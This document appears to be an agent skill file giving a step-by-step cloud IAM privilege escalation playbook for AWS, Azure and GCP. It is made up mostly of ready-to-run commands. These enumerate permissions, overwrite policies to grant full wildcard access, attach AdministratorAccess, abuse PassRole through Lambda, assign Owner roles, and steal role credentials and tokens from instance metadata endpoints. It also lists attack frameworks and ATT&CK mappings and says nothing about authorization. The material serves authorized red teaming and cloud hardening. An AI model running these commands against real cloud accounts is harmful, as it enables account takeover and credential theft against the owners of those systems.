---
name: iam-privesc
description: Cloud IAM privilege escalation methodology for AWS, Azure, and GCP. Covers misconfigured roles, policy enumeration, assume-role chaining, and escalation to admin/root equivalent access.
version: 1.0.0
license: Apache-2.0
---

# Cloud IAM Privilege Escalation

## Attack Surface

IAM misconfigurations that allow escalation: overly permissive roles, writable policy attachments, unintended trust relationships, wildcard permissions, privilege escalation via service accounts, and Lambda/EC2 metadata credential exposure.

## Methodology — AWS

### Phase 1 — Enumerate current permissions

```bash
# Current identity
aws sts get-caller-identity

# Enumerate attached policies
aws iam list-attached-user-policies --user-name <username>
aws iam list-user-policies --user-name <username>
aws iam list-groups-for-user --user-name <username>

# Get policy document (find escalation vectors)
aws iam get-policy-version --policy-arn <arn> --version-id v1

# Automated enumeration
python3 enumerate-iam.py --access-key <key> --secret-key <secret>
```

### Phase 2 — Key escalation vectors (AWS)

**iam:CreatePolicyVersion** (overwrite existing policy):
```bash
aws iam create-policy-version --policy-arn <arn> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

**iam:AttachUserPolicy** (attach AdministratorAccess):
```bash
aws iam attach-user-policy --user-name <username> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction:**
```bash
# Create Lambda with a high-privilege role and invoke it to escalate
aws lambda create-function --function-name priv-esc \
  --runtime python3.11 --role arn:aws:iam::ACCOUNT:role/HighPrivRole \
  --zip-file fileb://payload.zip --handler handler.main
aws lambda invoke --function-name priv-esc output.txt
```

**EC2 instance profile credential theft:**
```bash
# From EC2 instance: steal attached role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
# Use returned AccessKeyId, SecretAccessKey, Token externally
```

### Methodology — Azure

```bash
# Enumerate current role assignments
az role assignment list --all --include-inherited

# List available role definitions
az role definition list --query "[?roleType=='CustomRole']"

# Escalation: if Microsoft.Authorization/roleAssignments/write allowed
az role assignment create --assignee <principal-id> \
  --role "Owner" --scope /subscriptions/<sub-id>

# Managed identity abuse
az vm identity show --name <vm> --resource-group <rg>
# From inside the VM — steal managed identity token
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true
```

### Methodology — GCP

```bash
# Current identity and permissions
gcloud auth list
gcloud projects get-iam-policy <project-id>

# Service account impersonation (if iam.serviceAccounts.actAs allowed)
gcloud iam service-accounts generate-access-token <high-priv-sa@project.iam.gserviceaccount.com>

# Workload identity / metadata server credential theft
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

## Tools

- [enumerate-iam](https://github.com/andresriancho/enumerate-iam) — AWS permission bruteforce
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) — AWS attack framework
- [ScoutSuite](https://github.com/nccgroup/ScoutSuite) — multi-cloud auditing
- [CloudFox](https://github.com/BishopFox/cloudfox) — cloud privilege mapping
- [Prowler](https://github.com/prowler-cloud/prowler) — AWS/Azure/GCP security posture

## MITRE ATT&CK Mapping

- T1078.004 — Valid Accounts: Cloud Accounts
- T1548 — Abuse Elevation Control Mechanism
- T1552.005 — Unsecured Credentials: Cloud Instance Metadata API
